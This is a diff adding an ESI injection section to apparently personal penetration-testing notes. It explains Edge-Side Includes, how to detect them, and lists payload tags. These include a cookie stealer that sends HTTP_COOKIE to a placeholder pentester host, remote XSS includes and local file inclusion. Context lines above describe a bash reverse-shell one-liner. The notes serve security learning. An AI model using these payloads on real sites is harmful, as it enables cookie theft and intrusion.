@@ -604,3 +604,38 @@ the shell uses:
 - `| bin/bash 1>/tmp/foo` - execute `/bin/bash` redirecting the standard output descriptor to `/tmp/foo` 
 - `rm /tmp/foo` - cleanup the FIFO file 
 
+## Edge-Side Includes (ESI) Injection
+
+edge-side includes ESI is an XML-based markup language used to tackle performance issues by enabling heavy caching of web content that would otherwise be unstorable through traditional caching protocols 
+
+ESI allow for dynamic web content assembly at the edge of the network (CDN, user's browser, or reverse proxy) by instructing the page processor what needs to be done to complete page assembly through ESI element tags (xml) 
+
+ESI tags instruct an HTTP surrogate (reverse-proxy, caching server, etc.) to fetch additional info regarding a page with an already cached template    
+this info can come from another server before rending the page   
+ESI enable fully cached web pages to include dynamic content 
+
+ESI injection occurs when an attacker manages to reflect malicious ESI tags in the HTTP response   
+root cause is HTTP surrogates cannot validate the ESI tag origin so all tags are executed the same   
+
+we can identify the use of ESI by inspecting response headers for `Surrogate-Control: content="ESI/1.0"`   
+however, we usually need to use a blind attack to detect ESI; we can use ESI tags in HTTP requests to see if any proxy is parsing the request and if ESI injection is possible 
+
+some useful tags are: 
+
+```html
+// Basic detection
+<esi: include src=http://<PENTESTER IP>>
+
+// XSS Exploitation Example
+<esi: include src=http://<PENTESTER IP>/<XSSPAYLOAD.html>>
+
+// Cookie Stealer (bypass httpOnly flag)
+<esi: include src=http://<PENTESTER IP>/?cookie_stealer.php?=$(HTTP_COOKIE)>
+
+// Introduce private local files (Not LFI per se)
+<esi:include src="supersecret.txt">
+
+// Valid for Akamai, sends debug information in the response
+<esi:debug/>
+```
+
